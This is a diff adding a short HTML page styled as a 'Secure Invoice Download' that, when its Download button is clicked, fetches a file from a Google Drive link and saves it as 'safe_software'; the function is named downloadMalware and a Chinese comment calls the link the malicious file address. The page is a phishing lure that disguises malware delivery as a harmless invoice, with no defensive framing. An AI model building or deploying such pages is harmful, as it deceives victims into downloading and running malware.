@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Invoice Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        button {
+            padding: 10px;
+            background: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Your File is Ready</h2>
+        <p>Click below to download your file.</p>
+        <button onclick="downloadMalware()">Download</button>
+    </div>
+
+    <script>
+        function downloadMalware() {
+            let link = document.createElement("a");
+            link.href = "https://drive.usercontent.google.com/download?id=1OlCMQZ84Qo6633aLbEgxdHZ6DvcnCBtB&export=download&authuser=0"; // 恶意文件地址
+            link.download = "safe_software";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
